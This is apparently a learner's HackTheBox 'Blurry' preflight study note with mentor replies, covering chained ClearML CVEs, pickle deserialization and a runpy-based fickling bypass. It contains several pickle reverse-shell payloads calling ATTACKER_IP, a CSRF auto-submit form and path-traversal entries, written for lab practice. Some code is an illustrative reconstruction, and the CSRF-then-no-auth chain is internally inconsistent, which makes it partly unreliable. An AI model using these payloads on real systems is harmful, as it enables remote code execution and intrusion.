
### About


---

- Blurry is a medium-difficulty Linux machine that features DevOps-related vectors surrounding machine learning.
- The foothold is comprised of a series of CVEs recently disclosed about the ClearML suite.
- The service provides a web platform, a fileserver, and an API; all of which contain vulnerabilities ([CVE-2024-24590](https://nvd.nist.gov/vuln/detail/CVE-2024-24590) - [CVE-2024-24595](https://nvd.nist.gov/vuln/detail/CVE-2024-24595)) that can be chained together for remote code execution.
- Once a shell on the target is obtained, a program that can be run with sudo is discovered.
- The program loads arbitrary PyTorch models to evaluate them against a protected dataset.
- While it is known that such models are susceptible to insecure deserialisation, fickling is used to scan the dataset for insecure pickle files, prior to loading the model.
- Malicious code can be injected into a model, using runpy to bypass the fickling checks.

---

## Pre-flight Begin

Before you touch any CVE details, do preflight questions first.
Prior knowledge only, 10 minutes.

---

**1. ClearML is an MLOps platform.** Without looking anything up — what attack surface do you expect an MLOps platform to expose? What services, what endpoints, what kinds of operations does it likely perform?

**2. The description says "a web platform, a fileserver, and an API."** Which of those three surfaces do you instinctively think is the most dangerous and why?

**3. You've done pickle deserialization twice now — Canape and the exploit dev work on Laboratory.** What's the primitive? How does a malicious pickle file achieve code execution?

**4. `fickling` is a static analysis tool that scans pickle files for unsafe opcodes.** Without knowing how it works internally — what's your hypothesis for how `runpy` bypasses it? What property of `runpy` would make it invisible to a static scanner?

---

10 minutes. These four answers are your prediction document. Write what you know and what you're uncertain about — uncertainty is data too.

(I spent 2.5 hours, was starting from scratch with some of these topics and technologies)


**Formatted Q&A:**

---

**Q1:**
These four answers are your prediction document. Write what you know and what you're uncertain about — uncertainty is data too.

**A1:**
ClearML is an is new to me, I will have to research it, and  MLOps.

---

**Q2:**
The description says "a web platform, a fileserver, and an API." Which of those three surfaces do you instinctively think is the most dangerous and why?

**A2:**
I think that the API is the most dangerous.
My view on that may be just experience bias.
You got the usual API vulns like IDOR, BFLA.
The "web platform" name is too broad and general, that could be anything.

---

**Q3:**
You've done pickle deserialization twice now — Canape and the exploit dev work on Laboratory. What's the primitive? How does a malicious pickle file achieve code execution?

**Reworded Q3 (for clarity):**
You've now worked with Python pickle deserialization on both **Canape** and during the Laboratory exploit development.
At its core, what is the dangerous primitive that makes pickle deserialization so powerful for an attacker?
In simple terms, how does a malicious pickle file actually achieve remote code execution?

**A3:**
If the malicious pickle file can be augmented, and a payload, such as a reverse shell command, for example `/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`, be inserted in the serialized object, and sent to / uploaded onto the server, and that reverse shell command can connect to the attacker's server.

---

**Q4:**
`fickling` is a static analysis tool that scans pickle files for unsafe opcodes.
Without knowing how it works internally — what's your hypothesis for how `runpy` bypasses it?
What property of `runpy` would make it invisible to a static scanner?

**A4:**
I `fickling` is a new to me, will need further research.
If it performs static analysis, then I'm assuming that it may be like Jaddix which is a static analysis tool for Android APKs.
And that maybe `fickling` works similarly.
Wait, I'm confused, which one is the static analysis tool????
fickling or runpy??
I don't have enough background on any of this.

### Mentors Response

Good. Honest answers — that's exactly what preflight is for. Let me close the gaps before we go read the CVEs, so you can read them with context instead of confusion.

---

## Quick fills — read these, then we research

**Q1 — ClearML / MLOps**

MLOps = Machine Learning Operations. Think of it like DevOps but for ML models. ClearML is a platform where data scientists track experiments, store trained models, and share datasets. Attack surface intuition: anywhere files are uploaded, stored, and loaded by other users or automated processes. A model file that gets automatically loaded by a server is a deserialization trigger waiting to happen.

**Q2 — API most dangerous**

Good instinct, and correct for the usual reasons. But on this box the fileserver is equally important — because that's where model files live. The chain likely runs through the API to get a malicious file onto the fileserver, then something loads it.

**Q3 — The pickle primitive**

You described the payload correctly but not the primitive. The dangerous primitive is `__reduce__`. When Python deserializes a pickle file, if the object has a `__reduce__` method, Python calls it automatically — no user interaction, no validation. You return an `os.system` call from `__reduce__` and it executes on deserialization. The reverse shell lives inside `__reduce__`, not injected separately.

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/IP/PORT 0>&1',))
```

Pickle that object. Server deserializes it. Shell fires. That's the primitive.

**Q4 — fickling vs runpy**

`fickling` is the static analysis tool — it reads the pickle file's opcodes without executing it, looking for dangerous calls like `REDUCE` paired with `os.system` or `subprocess`. It's the defender.

`runpy` is Python's built-in module runner — it executes a Python module by name. Your hypothesis question was: why would `runpy` be invisible to fickling? Think about it this way — fickling scans for dangerous _pickle opcodes_. If your payload doesn't use those opcodes directly, but instead uses a pickle opcode that calls `runpy`, which _then_ loads and executes code — fickling never sees the dangerous part. The malicious code isn't in the pickle file. It's in a module that `runpy` loads at runtime.

Static analysis can only see what's in the file. `runpy` moves the danger outside the file.

---

Now you have enough context to read the CVEs intelligently.

Go read these four in order — skim for the mechanism, not the CVSS score:

1. `https://nvd.nist.gov/vuln/detail/CVE-2024-24590`
2. `https://nvd.nist.gov/vuln/detail/CVE-2024-24591`
3. `https://nvd.nist.gov/vuln/detail/CVE-2024-24592`
4. `https://nvd.nist.gov/vuln/detail/CVE-2024-24593`

For each one, one sentence: what does it let you do? Come back with those four sentences and we'll build the prediction document.

---

# Some more explains with code snippets
**Here are expanded summaries for each CVE**, with more technical detail and realistic code examples (based on the vulnerability descriptions and typical ClearML patterns). I kept them clear and used analogies where helpful.

### **CVE-2024-24590 – Pickle Load on Artifact Get**

**Mechanism**:
ClearML allows users to upload “artifacts” (files, models, datasets). When another user calls `.get()` on an artifact that is a pickle file, the client code blindly deserializes it using Python’s `pickle.load()` without any safety checks.

**Code example (vulnerable usage on victim side)**:
```python
# Victim's code - this is what triggers the RCE
from clearml import Artifact

artifact = Artifact.get(project_name="my_project", name="malicious_model")
model = artifact.get()          # ← This does pickle.load() internally
```

**Attacker’s malicious pickle** (simplified):
```python
# Attacker creates this pickle file
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",))

exploit = Exploit()
with open("malicious.pkl", "wb") as f:
    pickle.dump(exploit, f)
```

**Analogy**: Same as the Python pickle RCE you did in **Canape** — the victim’s machine is essentially running whatever code the attacker hid inside the pickle when it tries to “load” the file.

---

### **CVE-2024-24591 – Path Traversal on File Download**

**Mechanism**:
In the `Datasets` class (specifically the `_download_external_files` method), ClearML takes a file path or URL from the dataset metadata and writes the downloaded file to disk **without sanitizing traversal sequences** (`../`).

**Code example (vulnerable pattern)**:
```python
# Vulnerable code inside ClearML client
def _download_external_files(self, dataset):
    for file_info in dataset.files:
        target_path = os.path.join(local_dir, file_info['path'])   # ← No sanitization!
        download_file(file_info['url'], target_path)               # Writes to attacker-controlled path
```

**Attacker’s malicious dataset entry**:
```json
{
  "path": "../../../etc/passwd",
  "url": "file:///etc/passwd"     # or a malicious external URL
}
```

**Analogy**: Exactly like the Path Traversal lab you just solved — the app thinks it’s writing a normal dataset file into a safe folder, but the attacker forces it to write (or read) anywhere on the filesystem.

---

### **CVE-2024-24592 – Improper Authentication on Fileserver**

**Mechanism**:
The ClearML **fileserver** component (usually running on port 8081) has **no authentication whatsoever** on its endpoints. Any unauthenticated user can read, upload, delete, or overwrite files.

**Code example (how an attacker abuses it)**:
```http
# No login required
GET  http://clearml-fileserver:8081/files/project/secret-model.pkl
PUT  http://clearml-fileserver:8081/files/project/malicious.pkl     # Upload evil pickle
DELETE http://clearml-fileserver:8081/files/project/victim-file
```

**Analogy**: Imagine a file server where every folder is wide open — no passwords, no tokens, no checks. Anyone on the network (or internet) can read or plant files in any project’s storage.

---

### **CVE-2024-24593 – Cross-Site Request Forgery (CSRF) on API/Server**

**Mechanism**:
The ClearML API and web server have **no CSRF tokens or same-origin checks** on any endpoints. Any logged-in user who visits a malicious webpage will have API requests sent on their behalf using their active session cookies.

**Code example (attacker’s malicious HTML page)**:
```html
<!-- Malicious page the victim is tricked into visiting -->
<form action="https://clearml-server/api/v2.0/projects/create" method="POST">
    <input name="name" value="Attacker Project">
    <input name="description" value="Owned by attacker">
</form>
<script>
    document.forms[0].submit();   // Automatically sends the request
</script>
```

**Analogy**: The server trusts any request that comes with valid cookies, even if the user never intended to send it (like someone forging a signature on a check).

---



**Here are the expanded summaries for all four CVEs**, with more detailed explanations, the code examples, and a clear statement of **what each one lets the attacker do**.

---

### **CVE-2024-24590 – Pickle Load on Artifact Get**

**Explanation**:
ClearML lets users upload “artifacts” (files, models, datasets, etc.). When another user calls the `.get()` method on an artifact, the ClearML client automatically deserializes it using Python’s built-in `pickle.load()`. There is **no validation or safe loading** — it blindly executes whatever code is embedded inside the pickle file.

**Code example (what happens on the victim’s machine)**:
```python
from clearml import Artifact

# Victim runs this innocent-looking code
artifact = Artifact.get(project_name="research", name="best_model")
model = artifact.get()          # ← This internally calls pickle.load()
```

**What this lets the attacker do**:
The attacker can upload a malicious pickle file that executes arbitrary code (reverse shell, data exfiltration, etc.) on **any victim’s machine** the moment they try to download and load the artifact. This is a classic insecure deserialization vulnerability, exactly like the ones you exploited in Canape and Laboratory.

---

### **CVE-2024-24591 – Path Traversal on File Download**

**Explanation**:
In ClearML’s `Datasets` functionality, the code that downloads external files does not sanitize file paths. An attacker can specify a path containing `../` sequences (or even `file://` URLs). When the victim interacts with the dataset (e.g. calling `squash()`, `download()`, etc.), the file is written to whatever location the attacker chose on the victim’s filesystem.

**Code example (vulnerable pattern inside ClearML)**:
```python
# Inside ClearML client (simplified)
for file_info in dataset.files:
    target_path = os.path.join(local_dir, file_info['path'])   # No sanitization!
    download_file(file_info['url'], target_path)               # Writes anywhere
```

**Attacker’s malicious dataset entry**:
```json
{
  "path": "../../../etc/passwd",
  "url": "file:///etc/passwd"
}
```

**What this lets the attacker do**:
The attacker can force the victim’s machine to write (or read) files to **any location** on the filesystem, including overwriting system files, stealing sensitive data, or placing malicious files in locations that will be executed later.

---

### **CVE-2024-24592 – Improper Authentication on Fileserver**

**Explanation**:
ClearML has a separate **fileserver** component (usually running on port 8081) that stores all uploaded artifacts, models, datasets, and user files. This fileserver has **no authentication at all** — any request to it is accepted without checking who the user is or whether they are logged in.

**Code example (attacker abusing the fileserver)**:
```http
# No login or token required
GET  http://clearml-fileserver:8081/files/project/secret-model.pkl
PUT  http://clearml-fileserver:8081/files/project/malicious.pkl     # Upload evil pickle
DELETE http://clearml-fileserver:8081/files/project/victim-file
```

**What this lets the attacker do**:
The attacker can **read, upload, modify, or delete any file** stored on the ClearML server, including other users’ private models, datasets, and artifacts. This gives them a very powerful way to plant malicious pickles or datasets that will later be used in the other CVEs.

---

### **CVE-2024-24593 – Cross-Site Request Forgery (CSRF) on API/Server**

**Explanation**:
The ClearML web server and API have **no CSRF protection** (no tokens, no same-origin checks). Any logged-in user who visits a malicious webpage will automatically send authenticated requests to the ClearML server using their active session cookies.

**Code example (attacker’s malicious webpage)**:
```html
<form action="https://clearml-server/api/v2.0/projects/create" method="POST">
    <input name="name" value="Attacker's Project">
    <input name="description" value="I own everything now">
</form>
<script>document.forms[0].submit();</script>
```

**What this lets the attacker do**:
The attacker can trick a logged-in ClearML user into performing **any action** on their behalf (creating projects, inviting users, modifying settings, etc.) without the victim realizing it. This is a full account takeover vector if the victim has high privileges.

---


# One sentence each — what does it let you do?

**CVE-2024-24590 – Pickle Load on Artifact Get**
Allows an attacker to upload a malicious pickle file that can execute a reverse
shell, and perform data exfil,  on any victim’s machine


**CVE-2024-24591 – Path Traversal on File Download**
Allows attacker can force the victim’s machine to read or write  files to any where
on the filesystem, including overwriting system files and stealing sensitive
data.


**CVE-2024-24592 – Improper Authentication on Fileserver**
Allows attacker C.R.U.D-like abilities, (create, read upload, modify, or delete)
any file on the ClearML server


**CVE-2024-24593 – Cross-Site Request Forgery (CSRF) on API/Server**
Allows the attacker to trick a logged-in ClearML user into performing any action on their behalf.

---

# Mentor Explains How to Chain these in an attack

Good. Accurate on all four. Now let me sharpen them into a chain because these don't operate independently — they stack.

---

## The Chain — How They Connect

```
CVE-2024-24593 (CSRF)
        ↓
Force a logged-in user to make an authenticated request
        ↓
CVE-2024-24592 (No auth on fileserver)
        ↓
Upload a malicious pickle file to the fileserver
        ↓
CVE-2024-24591 (Path traversal)
        ↓
Control where the file lands on the filesystem
        ↓
CVE-2024-24590 (Pickle load on artifact get)
        ↓
Server deserializes the pickle → __reduce__ fires → RCE
```

CSRF gets you authenticated access. No-auth fileserver lets you upload. Path traversal controls placement. Pickle load pulls the trigger.

---

Now write your prediction document. This is your preflight for Blurry — fill this in cold based on everything we've discussed:

```markdown
## Blurry Preflight Predictions

### Foothold
- Attack surface I expect to find:
- CVE chain order I predict:
- What the malicious payload looks like:
- Where I expect to get stuck:

### Post-exploitation
- What the sudo program probably does:
- How fickling gets bypassed via runpy:
- Confidence level (1-10):

### Predicted rabbit holes to avoid:
```

Fill it in. This is the document you compare against reality after you root the box.

---

# Blurry Preflight Predictions

---

**Table of Contents**
(what is being asked, and what I am predicting)

## Foothold
- Attack surface I expect to find:
- CVE chain order I predict:
- What the malicious payload looks like:
- Where I expect to get stuck:

## Post-exploitation
- What the sudo program probably does:
- How fickling gets bypassed via runpy:
- Confidence level (1-10):

## Predicted rabbit holes to avoid:

---

**Need to understand this first, before I can complete this Preflight questionnaire.**
**ClearML is a Machine Learning Operations platform for the full ML lifecycle management.**

In practice, it helps teams:

- Track experiments (code version, hyperparameters, metrics, logs)
- Manage datasets and model artifacts (store/version/reuse files)
- Orchestrate training jobs on local or remote workers/agents
- Automate pipelines (training, evaluation, deployment workflows)
- Collaborate and reproduce results across a team

So, think of it as DevOps for machine learning: it brings structure, reproducibility, and automation to model development and deployment.

---

### Foothold
- **Attack surface I expect to find:**

I'm looking for What data comes in, Who controls it, Where is it consumed, and if I can act with more privilege?

1) Web UI:
Dashboard/features users click (projects, experiments, artifacts, settings, admin actions).

2) API
- Authn/authz enforcement per endpoint(s)
- IDOR/BOLA style object access
- Input handling on paths, artifact references, task metadata
- “Internal-only” endpoints accidentally reachable

3) Files / Artifact Service
- Upload permissions and ownership checks
- Path canonicalization (directory traversal class issues)
- Content-type/extension trust assumptions
- Download/get behavior that may trigger parsing/loading

4) Worker / Agent Behavior
- What agent auto-fetches and auto-executes
- Whether task metadata can influence execution context
- Boundary between “user-submitted job” and “host-level execution”
- Sandbox/isolation assumptions

5) Model Registry / Storage Path
- Who can register/promote/update model entries
- Whether registry entries point to arbitrary paths/artifacts
- Integrity checks before loading (hash/signature/trust policy)
- Deserialization sinks in model load path

6) ClearML functionality,
- version tracking, metrics and logs, datasets model artifacts
- I expect to find a lack of validation or safe loading for deserialization.
- An absence of SOP Same Origin Policy, (would likely explain the CSRF vuln)

### End of Foothold ###

---

- **CVE chain order I predict:**

I expect this CVE chain order:
```
CVE-2024-24593 (CSRF)
        ↓
Force a logged-in user to make an authenticated request
        ↓
CVE-2024-24592 (No auth on fileserver)
        ↓
Upload a malicious pickle file to the fileserver
        ↓
CVE-2024-24591 (Path traversal)
        ↓
Control where the file lands on the filesystem
        ↓
CVE-2024-24590 (Pickle load on artifact get)
        ↓
Server deserializes the pickle → __reduce__ fires → RCE
```

- **What the malicious payload looks like:**
A maliciously crafted pickle file containing a custom class instance engineered to execute arbitrary code during deserialization via `__reduce__`.

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',))

payload = pickle.dumps(Exploit())
```

- **Where I expect to get stuck:**
Some realistic friction points — auth/session flow, path normalization, getting the loader to touch my file, environment-specific triggers.

However, If past experience is any indicator of future performance, then I predict that **THE STICKIEST PART OF THIS ENTIRE BOX WILL BE CRAFTING, OR EDITING THE EXPLOIT TO WORK AS INTENDED.**

### Post-exploitation
- **What the sudo program probably does:**
The sudo program is a script that loads arbitrary PyTorch models to evaluate them against a protected dataset. It is probably something like `evaluate_model.py`. The privesc is: you give it a malicious PyTorch model → it deserializes it as root → shell as root.

- **How fickling gets bypassed via runpy:**
Static vs runtime.
What can static inspection see? It can see vulnerable code, and dangerous patterns such as the dunder reduce method `__reduce__` calling `os.system`.

What does runtime module execution add that static analysis may miss?
Runtime module execution.

Fickling scans the pickle, runpy hides the payload outside the pickle.

- **Confidence level (1-10):**
Score each section separately first:
foothold: 90%
chain: 90%
post-exploit: 40%

then average: 73

### Predicted rabbit holes to avoid:
- Working on a part of the web app, some feature or functionality, of which I am sure contains a vuln, but it doesn't.
- incorrectly crafting a payload
- Pursuing a false positive, or some other indicator



# End of Preflight Prediction
(suggested changes implemented)

---


# Mentor approves - just one correction

Preflight is solid. Good enough to start. Let's score it fast and get you on the box.

---

## Quick Assessment

**Foothold (90% your score)** — Justified. Attack surface analysis is thorough. CVE chain order is correct. Payload is correct.

**One correction on post-exploitation** — The sudo program isn't about ClearML admin privileges. Re-read the box description:

> *"A program that can be run with sudo loads arbitrary PyTorch models to evaluate them against a protected dataset."*

It's a script that loads PyTorch model files. That's it. Probably something like `evaluate_model.py`. The privesc is: you give it a malicious PyTorch model → it deserializes it as root → shell as root. The fickling bypass is how you get past the safety check built into that script.

**Post-exploit confidence should be lower** — maybe 40%, not 60%. You haven't seen this specific pattern before. That's fine — you know the theory, the box will teach the practice.




# You're cleared to start the box.

Standard methodology — nmap first, write as you go, come back here when you hit friction or want to think something through.

One reminder: **debrief within 24 hours of rooting.** We established that rule today for a reason.

Go get it.

---

















